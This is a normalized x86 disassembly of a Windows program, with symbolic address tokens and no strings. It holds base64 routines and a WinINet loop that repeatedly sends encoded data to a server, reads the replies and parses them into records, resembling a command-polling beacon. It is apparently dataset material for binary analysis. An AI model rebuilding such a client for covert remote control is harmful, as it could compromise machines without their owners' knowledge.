sub_401000
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
sar ecx 0x2
mov edx [ ebp + 0x8 ]
mov al [ ecx + r--data ]
mov [ edx ] al
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
and edx 0x3
shl edx 0x4
mov eax [ ebp + 0xc ]
movzx ecx [ eax + 0x1 ]
and ecx 0xf0
sar ecx 0x4
or edx ecx
mov eax [ ebp + 0x8 ]
mov cl [ edx + r--data ]
mov [ eax + 0x1 ] cl
cmp [ ebp + 0x10 ] 0x1
jle r-xdata
mov [ ebp - 0x1 ] 0x3d
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x1 ]
and eax 0xf
shl eax 0x2
mov ecx [ ebp + 0xc ]
movzx edx [ ecx + 0x2 ]
and edx 0xc0
sar edx 0x6
or eax edx
mov al [ eax + r--data ]
mov [ ebp - 0x1 ] al
jmp r-xdata
mov [ ebp - 0x2 ] 0x3d
mov eax [ ebp + 0xc ]
movzx ecx [ eax + 0x2 ]
and ecx 0x3f
mov dl [ ecx + r--data ]
mov [ ebp - 0x2 ] dl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ ebp - 0x1 ]
mov [ ecx + 0x2 ] dl
cmp [ ebp + 0x10 ] 0x2
jle r-xdata
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x2 ]
mov [ eax + 0x3 ] cl
mov esp ebp
pop ebp
retn
sub_4010b0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x8 ] 0x3
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
movsx edx [ ebp - 0xc ]
shl edx 0x2
movsx eax [ ebp - 0xb ]
sar eax 0x4
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dl
movsx edx [ ebp - 0xb ]
shl edx 0x4
movsx eax [ ebp - 0xa ]
sar eax 0x2
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1 ] dl
movsx edx [ ebp - 0xa ]
shl edx 0x6
and edx 0xc0
movsx eax [ ebp - 0x9 ]
or edx eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2 ] dl
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x3d
jne r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
mov ecx [ ebp - 0x4 ]
mov dl [ eax * 4 + r--data ]
mov [ ebp + ecx - 0xc ] dl
mov eax [ ebp - 0x4 ]
mov [ ebp + eax - 0xc ] 0x0
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx ecx [ ebp + eax - 0xc ]
cmp ecx 0x50
jne r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_401170
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0x4 ]
cmp ecx 0x4
jge r-xdata
mov [ ebp - 0xc ] 0x4
mov edx [ ebp + 0x10 ]
sub edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_401000
add esp 0xc
mov ecx [ ebp + 0x8 ]
add ecx 0x4
mov [ ebp + 0x8 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x3
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4011f0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov al [ edx ]
mov [ ebp - 0x15 ] al
add [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4010b0
add esp 0x8
add eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
jns r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x3
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x4
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x4
mov [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov esp ebp
pop ebp
retn
sub_4012a0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4011f0
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov esp ebp
pop ebp
retn
sub_4012d0
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax rw-data
pop ebp
retn
mov ecx [ rw-data ]
or ecx 0x1
mov [ rw-data ] ecx
mov ecx rw-data
call sub_401310
push sub_40c1a0
call sub_40320b
add esp 0x4
sub_401310
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi [ ebp - 0x4 ]
add edi 0xc
mov ecx 0x1a
mov esi r--data
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
add edi 0x22314
mov ecx 0x10
mov esi r--data
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
add edi 0x22354
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0x200
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x22114
push eax
call sub_409820
add esp 0xc
push 0x22000
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x10c
push ecx
call sub_409820
add esp 0xc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_401390
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0xc
push eax
call [ InternetOpenA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0xea60
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push 0x2
mov edx [ ebp - 0x4 ]
push edx
call [ InternetSetOptionA@IAT ]
mov [ ebp - 0x8 ] 0x1d4c0
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x6
mov ecx [ ebp - 0x4 ]
push ecx
call [ InternetSetOptionA@IAT ]
mov [ ebp - 0x8 ] 0xea60
push 0x4
lea edx [ ebp - 0x8 ]
push edx
push 0x5
mov eax [ ebp - 0x4 ]
push eax
call [ InternetSetOptionA@IAT ]
push 0x0
mov ecx [ ebp + 0x14 ]
push ecx
push 0x3
push 0x0
push 0x0
movzx edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call [ InternetConnectA@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x2210c ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn 0x10
sub_401460
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x8 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] 0x0
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
sub_4014d0
push ebp
mov ebp esp
sub esp 0xac4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xaa4 ] ecx
push 0x0
mov eax [ ebp - 0xaa4 ]
mov ecx [ eax + 0x2210c ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx [ ebp - 0xaa4 ]
mov edx [ ecx + 0x4 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0xaa4 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0xaa4 ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xaa0 ] 0x0
push 0x1ff
push 0x0
lea eax [ ebp - 0xa9f ]
push eax
call sub_409820
add esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x810 ] 0x0
push 0x7ff
push 0x0
lea ecx [ ebp - 0x80f ]
push ecx
call sub_409820
add esp 0xc
mov edx [ ebp - 0xaa4 ]
add edx 0x22114
mov [ ebp - 0xaa8 ] edx
mov eax [ ebp - 0xaa8 ]
add eax 0x1
mov [ ebp - 0xaac ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xaa8 ]
mov dl [ ecx ]
mov [ ebp - 0xaad ] dl
add [ ebp - 0xaa8 ] 0x1
cmp [ ebp - 0xaad ] 0x0
jne r-xdata
mov eax [ ebp - 0xaa8 ]
sub eax [ ebp - 0xaac ]
mov [ ebp - 0xab4 ] eax
cmp [ ebp - 0xab4 ] 0xa
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp - 0xaa4 ]
add eax 0x22314
push eax
lea ecx [ ebp - 0x810 ]
push ecx
call [ lstrcatA@IAT ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0xaa4 ]
add ecx 0x22114
push ecx
lea edx [ ebp - 0x810 ]
push edx
call [ lstrcatA@IAT ]
mov ecx [ ebp - 0xaa4 ]
add ecx 0x22354
push ecx
lea edx [ ebp - 0x810 ]
push edx
call [ lstrcatA@IAT ]
xor eax eax
mov [ ebp - 0x8a0 ] eax
mov [ ebp - 0x89c ] eax
mov [ ebp - 0x898 ] eax
mov [ ebp - 0x894 ] eax
mov [ ebp - 0x890 ] eax
mov [ ebp - 0x88c ] eax
mov [ ebp - 0x888 ] eax
mov [ ebp - 0x884 ] eax
mov [ ebp - 0x880 ] eax
mov [ ebp - 0x87c ] eax
mov [ ebp - 0x8a0 ] 0x28
mov [ ebp - 0x884 ] 0x0
lea ecx [ ebp - 0x810 ]
mov [ ebp - 0x898 ] ecx
mov edx [ ebp - 0x898 ]
push edx
call [ lstrlenA@IAT ]
mov [ ebp - 0x894 ] eax
lea eax [ ebp - 0x810 ]
mov [ ebp - 0xab8 ] eax
mov ecx [ ebp - 0xab8 ]
add ecx 0x1
mov [ ebp - 0xabc ] ecx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x810 ]
push eax
call [ lstrcatA@IAT ]
mov edx [ ebp - 0xab8 ]
mov al [ edx ]
mov [ ebp - 0xabd ] al
add [ ebp - 0xab8 ] 0x1
cmp [ ebp - 0xabd ] 0x0
jne r-xdata
mov ecx [ ebp - 0xab8 ]
sub ecx [ ebp - 0xabc ]
mov [ ebp - 0xac4 ] ecx
mov edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0xaa0 ]
push eax
mov ecx [ ebp - 0xac4 ]
push ecx
lea edx [ ebp - 0x810 ]
push edx
mov eax [ ebp - 0xaa4 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x878 ] 0x0
push 0x63
push 0x0
lea edx [ ebp - 0x877 ]
push edx
call sub_409820
add esp 0xc
push 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x878 ]
push ecx
push 0x13
mov edx [ ebp - 0xaa4 ]
mov eax [ edx + 0x8 ]
push eax
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov eax 0x1
jmp r-xdata
sub_401790
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x80 ] 0x0
push 0x63
push 0x0
lea eax [ ebp - 0x7f ]
push eax
call sub_409820
add esp 0xc
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x80 ]
push edx
push 0x5
mov eax [ ebp - 0x94 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8c ] 0x1
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_409820
add esp 0xc
mov [ ebp - 0x88 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
push edx
call sub_403350
add esp 0x4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x10 ] 0x0
cmp [ ebp - 0x8c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x88 ]
mov [ eax ] ecx
mov eax 0x1
mov [ ebp - 0x90 ] 0x0
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x84 ]
push ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x88 ]
push edx
mov eax [ ebp - 0x94 ]
mov ecx [ eax + 0x8 ]
push ecx
call [ InternetReadFile@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x84 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x90 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8c ] 0x0
je r-xdata
push 0xa
call [ Sleep@IAT ]
cmp [ ebp - 0x8c ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x84 ]
sub ecx [ ebp - 0x90 ]
mov [ ebp - 0x84 ] ecx
mov edx [ ebp - 0x88 ]
add edx [ ebp - 0x90 ]
mov [ ebp - 0x88 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x10 ]
jbe r-xdata
mov edx [ ebp - 0x88 ]
cmp edx [ ebp - 0x8 ]
jae r-xdata
jmp r-xdata
sub_401950
push ebp
mov ebp esp
push ecx
call sub_4012d0
mov ecx eax
call sub_401460
push __dos_header
push __dos_header
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4012d0
mov ecx eax
call sub_401390
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
push edx
push 0x0
mov eax [ ebp + 0x10 ]
push eax
call sub_4012d0
mov ecx eax
call sub_4014d0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x1
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4019d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x36cf4
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call sub_409820
add esp 0xc
push 0x36cf4
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x36cf4
push ecx
call sub_409820
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6d9e8 ] 0x0
push 0x80
push 0x0
mov eax [ ebp - 0x4 ]
add eax 0x6d9ec
push eax
call sub_409820
add esp 0xc
mov ecx [ ebp - 0x4 ]
add ecx 0x6d9ec
push ecx
push r--data
call sub_4012a0
add esp 0x8
mov edx 0x1f9a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x6da6c ] dx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_401a60
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
mov [ ebp - 0x84 ] ecx
mov ecx 0x1a
mov esi r--data
lea edi [ ebp - 0x80 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x8 ] r--data
xor eax eax
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x80 ]
push edx
push 0x50
push r--data
call sub_401950
add esp 0x10
call sub_4012d0
mov ecx eax
call sub_401460
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
sub_401ae0
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x108 ] ecx
push 0x2000
call sub_4030ce
add esp 0x4
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x108 ]
call sub_401a60
mov edx 0x1
test edx edx
je r-xdata
xor eax eax
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x104 ] edx
mov eax [ ebp - 0x104 ]
push eax
call sub_403484
add esp 0x4
mov [ ebp - 0x8 ] 0x493e0
cmp [ ebp - 0x8 ] 0xa
jbe r-xdata
mov [ ebp - 0x18 ] r--data
mov [ ebp - 0x14 ] r--data
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0xe8 ] 0x0
push 0x3f
push 0x0
lea ecx [ ebp - 0xe7 ]
push ecx
call sub_409820
add esp 0xc
push 0x2ee8
push r--data
lea edx [ ebp - 0xe8 ]
push edx
call sub_4032b6
add esp 0xc
mov [ ebp - 0xa0 ] 0x0
push 0x7f
push 0x0
lea eax [ ebp - 0x9f ]
push eax
call sub_409820
add esp 0xc
lea ecx [ ebp - 0xa0 ]
push ecx
push r--data
call sub_4012a0
add esp 0x8
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
mov ecx [ ebp - 0x108 ]
movzx edx [ ecx + 0x6da6c ]
push edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_401950
add esp 0x10
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x927c0
jae r-xdata
mov [ ebp - 0xc ] 0x2000
push 0xc8
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_4012d0
mov ecx eax
call sub_401790
call sub_4012d0
mov ecx eax
call sub_401460
cmp [ ebp - 0xc ] 0x1
jbe r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xa
div ecx
mov [ ebp - 0xf0 ] eax
mov [ ebp - 0xf4 ] 0x0
jmp r-xdata
mov [ rw-data ] 0x0
cmp [ ebp - 0xc ] 0x2000
jae r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax [ ebp - 0xf0 ]
jae r-xdata
mov [ rw-data ] 0x1
mov eax [ ebp - 0xc ]
add eax 0xa
push eax
call sub_4030ce
add esp 0x4
mov [ ebp - 0xfc ] eax
mov ecx [ ebp - 0xfc ]
mov [ ebp - 0xec ] ecx
mov edx [ ebp - 0xc ]
add edx 0xa
push edx
push 0x0
mov eax [ ebp - 0xec ]
push eax
call sub_409820
add esp 0xc
mov ecx [ ebp - 0xec ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_4012a0
add esp 0x8
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0xec ]
push ecx
mov ecx [ ebp - 0x108 ]
call sub_401d90
mov edx [ ebp - 0xec ]
mov [ ebp - 0x100 ] edx
mov eax [ ebp - 0x100 ]
push eax
call sub_403484
add esp 0x4
jmp r-xdata
jmp r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xf4 ]
add edx 0x1
mov [ ebp - 0xf4 ] edx
sub_401d90
push ebp
mov ebp esp
mov eax 0x3ead0
call sub_40a980
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push esi
push edi
mov [ ebp - 0x3eab0 ] ecx
mov [ ebp - 0x3e808 ] 0x0
push 0x3e7ff
push 0x0
lea eax [ ebp - 0x3e807 ]
push eax
call sub_409820
add esp 0xc
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x3e814 ] 0x0
mov [ ebp - 0x3e810 ] 0x0
mov [ ebp - 0x3e80c ] 0x0
push 0x36cf4
push 0x0
mov edx [ ebp - 0x3eab0 ]
push edx
call sub_409820
add esp 0xc
mov [ ebp - 0x3e818 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x3e814 ]
movsx eax [ edx ]
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x3e818 ]
cmp ecx [ ebp - 0x4 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
lea ecx [ ebp + eax - 0x3e808 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x3e814 ]
mov eax [ ebp - 0x3e810 ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp - 0x3e810 ]
add eax 0x1
mov [ ebp - 0x3e810 ] eax
mov ecx [ ebp - 0x3e814 ]
add ecx 0x1
mov [ ebp - 0x3e814 ] ecx
cmp [ ebp - 0x3e810 ] 0x100
jne r-xdata
mov ecx [ ebp - 0x3e814 ]
add ecx 0x1
mov [ ebp - 0x3e814 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x3e8
jne r-xdata
mov [ ebp - 0x3eaac ] 0x0
jmp r-xdata
mov edx [ ebp - 0x3e818 ]
shl edx 0x8
lea eax [ ebp + edx - 0x3e808 ]
mov [ ebp - 0x3e820 ] eax
mov ecx [ ebp - 0x3e820 ]
mov [ ebp - 0x3eab4 ] ecx
mov edx [ ebp - 0x3eab4 ]
add edx 0x1
mov [ ebp - 0x3eab8 ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x3e810 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x3eaac ]
cmp edx [ ebp - 0x3e80c ]
jae r-xdata
mov eax [ ebp - 0x3eab4 ]
mov cl [ eax ]
mov [ ebp - 0x3eab9 ] cl
add [ ebp - 0x3eab4 ] 0x1
cmp [ ebp - 0x3eab9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x3eab4 ]
sub edx [ ebp - 0x3eab8 ]
mov [ ebp - 0x3eac0 ] edx
jne r-xdata
mov ecx [ ebp - 0x3e814 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x3eab0 ]
mov edx [ ebp - 0x3e80c ]
mov [ ecx + 0x6d9e8 ] edx
pop edi
pop esi
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4030d9
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
movzx edx [ ecx + eax + 0x36eb4 ]
cmp edx 0x1
jne r-xdata
mov [ ebp - 0x3eaa0 ] 0x0
push 0x27f
push 0x0
lea eax [ ebp - 0x3ea9f ]
push eax
call sub_409820
add esp 0xc
mov [ ebp - 0x3e81c ] 0x0
mov [ ebp - 0x3eaa8 ] 0x0
mov [ ebp - 0x3eaa4 ] 0x0
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x3eaac ]
imul esi esi 0x1c1
add esi [ ebp - 0x3eab0 ]
mov edx [ ebp - 0x3eaac ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea edi [ eax + edx + 0x36cf4 ]
mov ecx 0x70
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi [ ebp - 0x3eaac ]
imul esi esi 0x1c1
add esi [ ebp - 0x3eab0 ]
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea edi [ ecx + eax + 0x36cf4 ]
mov ecx 0x10
[ edi ] [ esi ]
mov edx [ ebp - 0x3eaac ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea esi [ eax + edx + 0x40 ]
mov ecx [ ebp - 0x3eaac ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea edi [ edx + ecx + 0x36d34 ]
mov ecx 0x10
[ edi ] [ esi ]
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea esi [ ecx + eax + 0x80 ]
mov edx [ ebp - 0x3eaac ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea edi [ eax + edx + 0x36d74 ]
mov ecx 0x10
[ edi ] [ esi ]
mov ecx [ ebp - 0x3eaac ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea esi [ edx + ecx + 0xc0 ]
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea edi [ ecx + eax + 0x36db4 ]
mov ecx 0x10
[ edi ] [ esi ]
mov edx [ ebp - 0x3eaac ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea esi [ eax + edx + 0x100 ]
mov ecx [ ebp - 0x3eaac ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea edi [ edx + ecx + 0x36df4 ]
mov ecx 0x10
[ edi ] [ esi ]
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea esi [ ecx + eax + 0x140 ]
mov edx [ ebp - 0x3eaac ]
imul edx edx 0x1c1
mov eax [ ebp - 0x3eab0 ]
lea edi [ eax + edx + 0x36e34 ]
mov ecx 0x10
[ edi ] [ esi ]
mov ecx [ ebp - 0x3eaac ]
imul ecx ecx 0x1c1
mov edx [ ebp - 0x3eab0 ]
lea esi [ edx + ecx + 0x180 ]
mov eax [ ebp - 0x3eaac ]
imul eax eax 0x1c1
mov ecx [ ebp - 0x3eab0 ]
lea edi [ ecx + eax + 0x36e74 ]
mov ecx 0x10
[ edi ] [ esi ]
jmp r-xdata
mov edx [ ebp - 0x3e820 ]
mov [ ebp - 0x3eac4 ] edx
mov eax [ ebp - 0x3eac4 ]
add eax 0x1
mov [ ebp - 0x3eac8 ] eax
mov eax [ ebp - 0x3e818 ]
add eax 0x1
mov [ ebp - 0x3e818 ] eax
mov ecx [ ebp - 0x3eaac ]
add ecx 0x1
mov [ ebp - 0x3eaac ] ecx
jmp r-xdata
mov ecx [ ebp - 0x3eac4 ]
mov dl [ ecx ]
